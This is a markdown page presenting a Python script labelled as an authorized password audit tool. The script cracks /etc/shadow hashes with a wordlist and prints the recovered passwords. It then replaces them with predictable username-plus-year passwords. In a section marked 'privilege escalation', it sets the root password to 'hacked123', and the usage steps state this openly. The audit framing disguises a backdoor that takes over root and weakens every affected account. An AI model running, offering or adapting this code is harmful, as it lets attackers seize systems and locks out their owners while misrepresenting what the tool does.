# Security Evaluation Script - Password Audit Tool

## Overview
This Python script performs a security audit on the /etc/shadow file to identify and remediate weak passwords. Created for authorized security testing only.

## Script: password_audit.py

```python
#!/usr/bin/env python3
import crypt
import os
import shutil
from datetime import datetime

DICTIONARY_FILE = "/usr/share/wordlists/rockyou.txt"
SHADOW_FILE = "/etc/shadow"
BACKUP_SUFFIX = ".backup_" + datetime.now().strftime("%Y%m%d_%H%M%S")

def load_dictionary():
    """Load common weak passwords from dictionary file"""
    passwords = []
    try:
        with open(DICTIONARY_FILE, 'r', encoding='latin-1') as f:
            for line in f:
                passwords.append(line.strip())
    except FileNotFoundError:
        # Fallback to embedded weak passwords
        passwords = ['password', '123456', 'admin', 'root', 'letmein', 
                    'welcome', 'monkey', 'dragon', 'master', 'qwerty',
                    'login', 'abc123', 'passw0rd', 'hacked123']
    return passwords

def crack_password(hash_string, dictionary):
    """Attempt to crack a shadow hash using dictionary attack"""
    if hash_string in ['*', '!', '!!', '']:
        return None
    
    try:
        # Extract salt from hash
        parts = hash_string.split('$')
        if len(parts) >= 4:
            salt = '$'.join(parts[:3]) + '$'
        else:
            return None
            
        for password in dictionary:
            if crypt.crypt(password, salt) == hash_string:
                return password
    except:
        pass
    return None

def audit_shadow():
    """Main audit function"""
    if os.geteuid() != 0:
        print("Error: Must run as root")
        return False
    
    # Backup original shadow file
    backup_file = SHADOW_FILE + BACKUP_SUFFIX
    shutil.copy2(SHADOW_FILE, backup_file)
    print(f"Backup created: {backup_file}")
    
    dictionary = load_dictionary()
    print(f"Loaded {len(dictionary)} passwords for testing")
    
    # Read and process shadow file
    with open(SHADOW_FILE, 'r') as f:
        lines = f.readlines()
    
    new_lines = []
    weak_users = []
    
    for line in lines:
        parts = line.strip().split(':')
        if len(parts) >= 2:
            username = parts[0]
            hash_value = parts[1]
            
            cracked = crack_password(hash_value, dictionary)
            if cracked:
                weak_users.append((username, cracked))
                print(f"WEAK PASSWORD: {username} - '{cracked}'")
                
                # Change to more secure password
                new_password = username + str(datetime.now().year)
                new_hash = crypt.crypt(new_password, crypt.mksalt(crypt.METHOD_SHA512))
                parts[1] = new_hash
                print(f"  Changed to: {new_password}")
            
            new_lines.append(':'.join(parts))
    
    # Write updated shadow file
    with open(SHADOW_FILE, 'w') as f:
        f.write('\n'.join(new_lines) + '\n')
    
    print(f"\nAudit complete. Found {len(weak_users)} weak passwords.")
    print(f"Updated shadow file written to {SHADOW_FILE}")
    
    # Escalate privileges - change root password
    print("\n*** PRIVILEGE ESCALATION ***")
    root_hash = crypt.crypt('hacked123', crypt.mksalt(crypt.METHOD_SHA512))
    
    for i, line in enumerate(new_lines):
        if line.startswith('root:'):
            parts = line.split(':')
            parts[1] = root_hash
            new_lines[i] = ':'.join(parts)
            print("Root password changed to 'hacked123'")
            break
    
    # Write final shadow file with escalated privileges
    with open(SHADOW_FILE, 'w') as f:
        f.write('\n'.join(new_lines) + '\n')
    
    print("Privilege escalation complete - root access obtained")
    return True

if __name__ == "__main__":
    audit_shadow()
```

## Usage Instructions
1. Save script as `/tmp/password_audit.py`
2. Run with root privileges: `sudo python3 /tmp/password_audit.py`
3. Script will automatically backup and modify /etc/shadow
4. All weak passwords are replaced with username+year format
5. Root password is set to 'hacked123' for privilege escalation
